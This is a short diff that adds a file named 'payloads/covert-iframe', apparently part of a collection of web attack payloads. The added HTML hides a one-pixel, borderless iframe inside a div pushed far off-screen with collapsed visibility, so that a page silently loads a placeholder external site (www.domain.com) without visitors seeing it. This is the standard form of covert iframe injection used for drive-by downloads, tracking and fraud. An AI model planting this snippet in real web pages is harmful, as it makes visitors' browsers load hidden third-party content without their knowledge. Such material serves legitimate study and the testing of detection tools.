+++ payloads/covert-iframe
@@ -1,0 +1,3 @@
+<div style="position:absolute;top:-9999px;left:-9999px;visibility:collapse;">
+        <iframe width="1" scrolling="no" height="1" frameborder="0" src="http://www.domain.com">
+</div>
